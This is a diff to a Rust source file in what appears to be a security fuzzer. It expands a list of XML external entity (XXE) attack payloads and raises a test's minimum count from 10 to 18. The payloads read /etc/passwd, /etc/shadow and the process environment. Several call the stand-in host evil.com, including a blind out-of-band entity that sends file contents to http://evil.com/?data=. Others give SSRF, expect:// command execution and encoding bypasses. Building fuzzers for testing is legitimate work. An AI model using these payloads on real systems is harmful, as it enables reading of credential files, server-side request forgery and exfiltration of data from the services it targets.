@@ -22,113 +22,165 @@
 use crate::fuzzer::payloads::{Payload, PayloadType, Severity};
 
 pub fn get_payloads() -> Vec<Payload> {
-    vec![
-        Payload {
-            payload_type: PayloadType::Xxe,
-            payload: r#"<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>"#.to_string(),
-            description: "Basic XXE file read".to_string(),
-            severity: Severity::Critical,
-            tags: vec!["xxe".to_string(), "file-read".to_string()],
-        },
-        Payload {
-            payload_type: PayloadType::Xxe,
-            payload: r#"<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/shadow">]><foo>&xxe;</foo>"#.to_string(),
-            description: "XXE /etc/shadow read".to_string(),
-            severity: Severity::Critical,
-            tags: vec!["xxe".to_string(), "file-read".to_string()],
-        },
-        Payload {
-            payload_type: PayloadType::Xxe,
-            payload: r#"<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///">]><foo>&xxe;</foo>"#.to_string(),
-            description: "XXE directory listing".to_string(),
-            severity: Severity::High,
-            tags: vec!["xxe".to_string(), "directory".to_string()],
-        },
-        Payload {
-            payload_type: PayloadType::Xxe,
-            payload: r#"<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://evil.com/evil.dtd">]><foo>&xxe;</foo>"#.to_string(),
-            description: "XXE external entity".to_string(),
-            severity: Severity::Critical,
-            tags: vec!["xxe".to_string(), "ssrf".to_string()],
-        },
-        Payload {
-            payload_type: PayloadType::Xxe,
-            payload: r#"<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "file:///etc/passwd">%xxe;]>"#.to_string(),
-            description: "XXE parameter entity".to_string(),
-            severity: Severity::Critical,
-            tags: vec!["xxe".to_string(), "parameter-entity".to_string()],
-        },
-        Payload {
-            payload_type: PayloadType::Xxe,
-            payload: r#"<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///proc/self/environ">]><foo>&xxe;</foo>"#.to_string(),
-            description: "XXE read process environment".to_string(),
-            severity: Severity::High,
-            tags: vec!["xxe".to_string(), "env".to_string()],
-        },
-        Payload {
-            payload_type: PayloadType::Xxe,
-            payload: r#"<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "expect://id">]><foo>&xxe;</foo>"#.to_string(),
-            description: "XXE expect protocol".to_string(),
-            severity: Severity::Critical,
-            tags: vec!["xxe".to_string(), "rce".to_string()],
-        },
-        Payload {
-            payload_type: PayloadType::Xxe,
-            payload: r#"<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php">]><foo>&xxe;</foo>"#.to_string(),
-            description: "XXE PHP filter read source".to_string(),
-            severity: Severity::High,
-            tags: vec!["xxe".to_string(), "file-read".to_string()],
-        },
-        Payload {
-            payload_type: PayloadType::Xxe,
-            payload: r#"<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "jar:http://evil.com/evil.jar!/file">]><foo>&xxe;</foo>"#.to_string(),
-            description: "XXE jar protocol".to_string(),
-            severity: Severity::High,
-            tags: vec!["xxe".to_string(), "ssrf".to_string()],
-        },
-        Payload {
-            payload_type: PayloadType::Xxe,
-            payload: r#"<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "gopher://evil.com/_test">]><foo>&xxe;</foo>"#.to_string(),
-            description: "XXE gopher protocol SSRF".to_string(),
-            severity: Severity::High,
-            tags: vec!["xxe".to_string(), "ssrf".to_string()],
-        },
-        Payload {
-            payload_type: PayloadType::Xxe,
-            payload: r#"<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include href="file:///etc/passwd"/></foo>"#.to_string(),
-            description: "XXE XInclude".to_string(),
-            severity: Severity::Critical,
-            tags: vec!["xxe".to_string(), "xinclude".to_string()],
-        },
-        Payload {
-            payload_type: PayloadType::Xxe,
-            payload: r#"<?xml version="1.0" standalone="yes"?><!DOCTYPE foo [<!ENTITY % swaliatd SYSTEM "file:///etc/passwd">]>"#.to_string(),
-            description: "XXE alternative doctype".to_string(),
-            severity: Severity::Critical,
-            tags: vec!["xxe".to_string()],
-        },
-        Payload {
-            payload_type: PayloadType::Xxe,
-            payload: r#"<?xml version="1.0"?><root><item>&amp;</item></root>"#.to_string(),
-            description: "XXE entity encoding test".to_string(),
-            severity: Severity::Medium,
-            tags: vec!["xxe".to_string(), "encoding".to_string()],
-        },
-        Payload {
-            payload_type: PayloadType::Xxe,
-            payload: r#"<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "data://text/plain;base64,Zm9v">]><foo>&xxe;</foo>"#.to_string(),
-            description: "XXE data protocol".to_string(),
-            severity: Severity::High,
-            tags: vec!["xxe".to_string(), "data-protocol".to_string()],
-        },
-        Payload {
-            payload_type: PayloadType::Xxe,
-            payload: r#"<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "netdoc:///etc/hosts">]><foo>&xxe;</foo>"#.to_string(),
-            description: "XXE netdoc protocol".to_string(),
-            severity: Severity::High,
-            tags: vec!["xxe".to_string(), "file-read".to_string()],
-        },
-    ]
+    let mut payloads = Vec::new();
+
+    payloads.push(Payload {
+        payload_type: PayloadType::Xxe,
+        payload: r#"<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>"#.to_string(),
+        description: "Basic XXE file read".to_string(),
+        severity: Severity::Critical,
+        tags: vec!["xxe".to_string(), "file-read".to_string()],
+    });
+    payloads.push(Payload {
+        payload_type: PayloadType::Xxe,
+        payload: r#"<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/shadow">]><foo>&xxe;</foo>"#.to_string(),
+        description: "XXE /etc/shadow read".to_string(),
+        severity: Severity::Critical,
+        tags: vec!["xxe".to_string(), "file-read".to_string()],
+    });
+    payloads.push(Payload {
+        payload_type: PayloadType::Xxe,
+        payload: r#"<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///">]><foo>&xxe;</foo>"#.to_string(),
+        description: "XXE directory listing".to_string(),
+        severity: Severity::High,
+        tags: vec!["xxe".to_string(), "directory".to_string()],
+    });
+    payloads.push(Payload {
+        payload_type: PayloadType::Xxe,
+        payload: r#"<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://evil.com/evil.dtd">]><foo>&xxe;</foo>"#.to_string(),
+        description: "XXE external entity".to_string(),
+        severity: Severity::Critical,
+        tags: vec!["xxe".to_string(), "ssrf".to_string()],
+    });
+    payloads.push(Payload {
+        payload_type: PayloadType::Xxe,
+        payload: r#"<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "file:///etc/passwd">%xxe;]>"#.to_string(),
+        description: "XXE parameter entity".to_string(),
+        severity: Severity::Critical,
+        tags: vec!["xxe".to_string(), "parameter-entity".to_string()],
+    });
+    payloads.push(Payload {
+        payload_type: PayloadType::Xxe,
+        payload: r#"<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///proc/self/environ">]><foo>&xxe;</foo>"#.to_string(),
+        description: "XXE read process environment".to_string(),
+        severity: Severity::High,
+        tags: vec!["xxe".to_string(), "env".to_string()],
+    });
+    payloads.push(Payload {
+        payload_type: PayloadType::Xxe,
+        payload: r#"<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "expect://id">]><foo>&xxe;</foo>"#.to_string(),
+        description: "XXE expect protocol".to_string(),
+        severity: Severity::Critical,
+        tags: vec!["xxe".to_string(), "rce".to_string()],
+    });
+    payloads.push(Payload {
+        payload_type: PayloadType::Xxe,
+        payload: r#"<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php">]><foo>&xxe;</foo>"#.to_string(),
+        description: "XXE PHP filter read source".to_string(),
+        severity: Severity::High,
+        tags: vec!["xxe".to_string(), "file-read".to_string()],
+    });
+    payloads.push(Payload {
+        payload_type: PayloadType::Xxe,
+        payload: r#"<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "jar:http://evil.com/evil.jar!/file">]><foo>&xxe;</foo>"#.to_string(),
+        description: "XXE jar protocol".to_string(),
+        severity: Severity::High,
+        tags: vec!["xxe".to_string(), "ssrf".to_string()],
+    });
+    payloads.push(Payload {
+        payload_type: PayloadType::Xxe,
+        payload: r#"<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "gopher://evil.com/_test">]><foo>&xxe;</foo>"#.to_string(),
+        description: "XXE gopher protocol SSRF".to_string(),
+        severity: Severity::High,
+        tags: vec!["xxe".to_string(), "ssrf".to_string()],
+    });
+    payloads.push(Payload {
+        payload_type: PayloadType::Xxe,
+        payload: r#"<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include href="file:///etc/passwd"/></foo>"#.to_string(),
+        description: "XXE XInclude".to_string(),
+        severity: Severity::Critical,
+        tags: vec!["xxe".to_string(), "xinclude".to_string()],
+    });
+    payloads.push(Payload {
+        payload_type: PayloadType::Xxe,
+        payload: r#"<?xml version="1.0" standalone="yes"?><!DOCTYPE foo [<!ENTITY % swaliatd SYSTEM "file:///etc/passwd">]>"#.to_string(),
+        description: "XXE alternative doctype".to_string(),
+        severity: Severity::Critical,
+        tags: vec!["xxe".to_string()],
+    });
+    payloads.push(Payload {
+        payload_type: PayloadType::Xxe,
+        payload: r#"<?xml version="1.0"?><root><item>&amp;</item></root>"#.to_string(),
+        description: "XXE entity encoding test".to_string(),
+        severity: Severity::Medium,
+        tags: vec!["xxe".to_string(), "encoding".to_string()],
+    });
+    payloads.push(Payload {
+        payload_type: PayloadType::Xxe,
+        payload: r#"<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "data://text/plain;base64,Zm9v">]><foo>&xxe;</foo>"#.to_string(),
+        description: "XXE data protocol".to_string(),
+        severity: Severity::High,
+        tags: vec!["xxe".to_string(), "data-protocol".to_string()],
+    });
+    payloads.push(Payload {
+        payload_type: PayloadType::Xxe,
+        payload: r#"<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "netdoc:///etc/hosts">]><foo>&xxe;</foo>"#.to_string(),
+        description: "XXE netdoc protocol".to_string(),
+        severity: Severity::High,
+        tags: vec!["xxe".to_string(), "file-read".to_string()],
+    });
+
+    payloads.push(Payload {
+        payload_type: PayloadType::Xxe,
+        payload: r#"<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % data SYSTEM "file:///etc/passwd"><!ENTITY % param "<!ENTITY exfil SYSTEM 'http://evil.com/?data=%data;'>">%param;]><foo>&exfil;</foo>"#.to_string(),
+        description: "XXE blind OOB exfiltration".to_string(),
+        severity: Severity::Critical,
+        tags: vec!["xxe".to_string(), "blind".to_string(), "oob".to_string()],
+    });
+    payloads.push(Payload {
+        payload_type: PayloadType::Xxe,
+        payload: r#"<?xml version="1.0" standalone="yes"?><!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg"><text font-size="16" x="0" y="16">&xxe;</text></svg>"#.to_string(),
+        description: "XXE in SVG file upload".to_string(),
+        severity: Severity::Critical,
+        tags: vec!["xxe".to_string(), "svg".to_string(), "file-upload".to_string()],
+    });
+    payloads.push(Payload {
+        payload_type: PayloadType::Xxe,
+        payload: r#"<?xml version="1.0" encoding="UTF-7"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>"#.to_string(),
+        description: "XXE UTF-7 encoding bypass".to_string(),
+        severity: Severity::High,
+        tags: vec!["xxe".to_string(), "encoding".to_string(), "bypass".to_string()],
+    });
+    payloads.push(Payload {
+        payload_type: PayloadType::Xxe,
+        payload: r#"<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % dtd SYSTEM "http://evil.com/evil.dtd">%dtd;]><foo>test</foo>"#.to_string(),
+        description: "XXE SSRF via external DTD".to_string(),
+        severity: Severity::Critical,
+        tags: vec!["xxe".to_string(), "ssrf".to_string(), "external-dtd".to_string()],
+    });
+    payloads.push(Payload {
+        payload_type: PayloadType::Xxe,
+        payload: r#"<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///nonexistent">]><foo>&xxe;</foo>"#.to_string(),
+        description: "XXE error-based detection".to_string(),
+        severity: Severity::Medium,
+        tags: vec!["xxe".to_string(), "error-based".to_string()],
+    });
+    payloads.push(Payload {
+        payload_type: PayloadType::Xxe,
+        payload: r#"{"root":{"@xmlns:xxe":"http://someurl","xxe:foo":"&xxe;"}}"#.to_string(),
+        description: "XXE via JSON-to-XML conversion".to_string(),
+        severity: Severity::High,
+        tags: vec!["xxe".to_string(), "json".to_string()],
+    });
+    payloads.push(Payload {
+        payload_type: PayloadType::Xxe,
+        payload: r#"<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "file:///etc/passwd"><!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'file:///dev/null?%xxe;'>">%eval;%exfil;]>"#.to_string(),
+        description: "XXE parameter entity chain".to_string(),
+        severity: Severity::Critical,
+        tags: vec!["xxe".to_string(), "parameter-entity".to_string(), "chain".to_string()],
+    });
+
+    payloads
 }
 
 #[cfg(test)]
@@ -216,7 +268,7 @@ mod tests {
     fn minimum_payload_count() {
         let payloads = get_payloads();
         assert!(
-            payloads.len() >= 10,
+            payloads.len() >= 18,
             "Must have substantial XXE payload coverage, got {}",
             payloads.len()
         );
